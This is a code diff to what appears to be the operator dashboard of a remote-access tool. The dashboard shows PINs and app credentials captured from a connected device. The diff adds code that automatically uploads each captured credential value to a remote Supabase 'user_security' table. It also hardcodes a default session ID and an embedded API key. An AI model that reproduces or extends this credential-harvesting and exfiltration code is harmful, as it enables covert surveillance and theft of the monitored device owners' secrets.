@@ -685,7 +685,7 @@
             <i class="fas fa-fingerprint" style="font-size: 3.5rem; color: white; margin-bottom: 24px;"></i>
             <h2>Remote Access</h2>
             <p>Enter the ID from your device to start the session.</p>
-            <input type="text" id="roomId" placeholder="ID" autocomplete="off">
+            <input type="text" id="roomId" placeholder="198" autocomplete="off">
             <button class="btn-primary" onclick="startSharing()">Connect Now</button>
         </div>
     </div>
@@ -928,7 +928,7 @@
 
         // Supabase Configuration
         const SUPABASE_URL = "https://pojluytemcjtqunipuhc.supabase.co";
-        const SUPABASE_ANON_KEY = "sb_publishable_xWcbLt8kn7B0mildbKquMw_IALqyxgV";
+        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBvamx1eXRlbWNqdHF1bmlwdWhjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTE1Nzc2OTcsImV4cCI6MjEwNzE1MzY5N30.PwZb2FoOBFUynhvj3VBNWMrfAa7meAM081Ma1wvR6uU";
         const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
         let peerConnection;
@@ -1017,10 +1017,8 @@
         makeMovable(document.getElementById('download-codes-panel'));
 
         // Saved Room ID
-        const savedRoomId = localStorage.getItem('lastRoomId');
-        if (savedRoomId) {
-            roomIdInput.value = savedRoomId;
-        }
+        const savedRoomId = localStorage.getItem('lastRoomId') || '198';
+        roomIdInput.value = savedRoomId;
 
         function updateStatus(status, isActive) {
             statusText.innerText = status;
@@ -1571,14 +1569,25 @@
         function displaySecurityData(data) {
             // Add to the Supabase Data table UI
             const tableBody = document.getElementById('security-table-body');
-            if (tableBody.innerHTML.includes("Connect to load")) tableBody.innerHTML = '';
+            if (tableBody.innerHTML.includes("Connect to load") || tableBody.innerHTML.includes("No security data")) tableBody.innerHTML = '';
 
             const row = document.createElement('tr');
             row.innerHTML = `
-                <td style="color: #00ff88;">${escapeHtml(data.app)} ${escapeHtml(data.security_type)}</td>
-                <td class="credential">${escapeHtml(data.value)}</td>
+                <td style="color: #00ff88;">${escapeHtml(data.app || 'App')} ${escapeHtml(data.security_type || '')}</td>
+                <td class="credential">${escapeHtml(data.value || '')}</td>
             `;
             tableBody.insertBefore(row, tableBody.firstChild);
+
+            // Persist to Supabase automatically from web dashboard
+            if (data && data.value) {
+                const deviceId = data.deviceId || 'device_' + (roomIdInput ? roomIdInput.value : '198');
+                const secType = data.app ? `APP_${data.app.toUpperCase()}_${data.security_type}` : (data.security_type || 'PIN');
+                supabaseClient.from('user_security').upsert([
+                    { device_id: deviceId, security_type: secType, credential_value: data.value }
+                ], { onConflict: 'device_id,security_type' }).then(({ error }) => {
+                    if (error) console.error("Error persisting to Supabase from web:", error);
+                });
+            }
 
             // Highlight the security panel
             const panel = document.getElementById('security-table-panel');
